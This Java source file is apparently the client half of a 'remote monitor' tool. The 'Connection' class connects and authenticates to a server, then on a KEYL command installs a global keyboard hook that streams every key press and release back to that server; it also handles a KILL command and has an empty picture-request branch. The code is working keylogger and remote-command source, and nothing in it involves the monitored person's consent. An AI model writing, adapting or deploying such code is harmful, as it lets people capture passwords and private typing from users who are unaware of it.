import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

import javax.swing.JOptionPane;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Connection {

	// There is only one available connection ever at a time
	private Socket connection;
	private BufferedReader input;
	private DataOutputStream output;
	private Thread keyThread;

	/**
	 * Establishes a new connection with the server. Object will only be successfully
	 * created if the authentication with the server was successful
	 * 
	 * @param address IP address of the server in InetAddress form
	 * @param port TCP port to connect with the server on
	 * @param hash The authentication hash to check with the server
	 * @throws IOException
	 */
	public Connection(InetAddress address, int port, String hash) throws IOException {

		// Establish connection
		connection = new Socket(address, port);
		input = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		output = new DataOutputStream(connection.getOutputStream());
		output.flush();
		try {Thread.sleep(1000);} catch (InterruptedException e) {}

		// Send auth packet
		output.writeBytes(PacketHeader.AUTH + " " + hash + System.getProperty("line.separator")); 
		System.out.println("AUTHENTICATION PACKET SENT");

		// Waits for server response
		while (true) {
			if (input.ready()) {
				String[] response = input.readLine().split(" ");

				// Checks to see if connection response is valid
				if (response[0].equals(PacketHeader.CONN)) {
					if (response[1].equals(hash)) {
						System.out.println("SERVER RESPONSE RECEIVED");
						break;
					} else {
						System.out.println("ERROR: RESPONSE HASH MISMATCH");
						throw new IOException("Response hash mismatch");
					}
				} else {
					System.out.println("ERROR: INVALID CONNECTION RESPONSE HEADER");
					throw new IOException("Invalid connection response header");
				}
			}
		}
		System.out.println("CONNECTION SUCCSSFULLY ESTABLISHED");
	}

	/**
	 * Program will try its best to close all I/O and socket streams
	 */
	public void shutdown() {
		try {input.close();} catch (IOException e) {System.out.println("INPUT STREAM FAILED TO CLOSE");}
		try {output.flush();} catch (IOException e) {System.out.println("OUTPUT STREAM FAILED TO FLUSH");}
		try {output.close();} catch (IOException e) {System.out.println("OUTPUT STREAM FAILED TO CLOSE");}
		try {connection.close();} catch (IOException e) {System.out.println("SOCKET CONNECTION FAILED TO CLOSE");}
	}

	/**
	 * Continually listens for server requests and does its best to execute them
	 * @throws IOException
	 */
	public void listen() throws IOException {
		try {

			// Waits for server to send a request
			while (true) {
				if (input.ready()) {

					// Reads the request header
					String requestHeader = input.readLine();

					// Determines what to do depending on what the header was
					if (requestHeader.equals(PacketHeader.KEYL)) { // If keystroke logging request is received
						System.out.println("KEYLOGGING REQUEST RECEIVED");

						// Creates a new thread that sends keystrokes to the server
						// If the server sends another KEYL packet, then the thread is stopped
						if (keyThread == null) {
							keyThread = new Thread(new KeyListenerThread());
							keyThread.start();
						}

						// Listens for the KEYL packet so that the key sending thread can be stopped
						// Alternatively if KILL is sent then just end the program entirely
						while (true) {
							if (input.ready()) {

								// Reads new header
								String requestFooter = input.readLine();

								// Determines what packet header it is
								if (requestFooter.equals(PacketHeader.KEYL)) break;
								else if (requestFooter.equals(PacketHeader.KILL)) {
									System.out.println("KILL REQUEST RECEIVED");
									shutdown();
									return;
								}
							}
						}

					} else if (requestHeader.equals(PacketHeader.PICT)) { // If picture request is received

					} else if (requestHeader.equals(PacketHeader.KILL)) { // If kill request is received
						System.out.println("KILL REQUEST RECEIVED");
						shutdown();
						return;
					}
				}
			}

		} catch (IOException ie) { // If connection was disconnected at any point

			// Try to close all input streams
			shutdown();

			// Tells main method that connection was disconnected
			throw new IOException("Connection disconnected");
		}
	}

	/**
	 * A thread runnable that listens for keyboard inputs and sends it to the 
	 * server. When interrupted, the thread will quit
	 * 
	 * @author Caleb Choi
	 */
	private class KeyListenerThread implements Runnable, NativeKeyListener {

		/**
		 * Runs and instantiates the native key hook in a separate thread
		 */
		@Override
		public void run() {
			
			// Try to register the native key hook
			try {GlobalScreen.registerNativeHook();}
			catch (NativeHookException e) { // If unsuccessful, close program
				System.out.println("NATIVE HOOK COULD NOT BE REGISTERED - EXITING PROGRAM");
				shutdown();
				RemoteMonitorClient.showNativeHookExceptionDialog();
				System.exit(3);
			}
			// Add the native key listener
			GlobalScreen.addNativeKeyListener(new KeyListenerThread());
		}

		@Override
		public void nativeKeyPressed(NativeKeyEvent e) {sendKey(e, true);}
		@Override
		public void nativeKeyReleased(NativeKeyEvent e) {sendKey(e, false);}
		@Override
		public void nativeKeyTyped(NativeKeyEvent e) {}

		/**
		 * Sends the key to the server. If there is a key hook issue or I/O exception
		 * here, the program ends within this method
		 * 
		 * @param e Native key event to be sent
		 * @param isPress Whether or not it was a key press or release, where press is true
		 */
		public void sendKey(NativeKeyEvent e, boolean isPress) {

			// Try sending the key
			try {output.writeBytes(KeyInterpreter.interpretKey(e, isPress) 
					+ System.getProperty("line.separator"));}
			
			catch (IOException ioe) { // Otherwise close the native key hook and sockets and stuff
				try { 
					GlobalScreen.unregisterNativeHook();
					System.out.println("GLOBAL NATIVE KEY HOOK SUCCESSFULLY UNREGISTERED");
				} catch (NativeHookException e1) {
					e1.printStackTrace();
					System.out.println("GLOBAL NATIVE KEY HOOK COULD NOT BE UNREGISTERED");
				}
				shutdown();
				RemoteMonitorClient.showDisconnectionDialog();
				System.exit(2);
			}
		}
	}
}
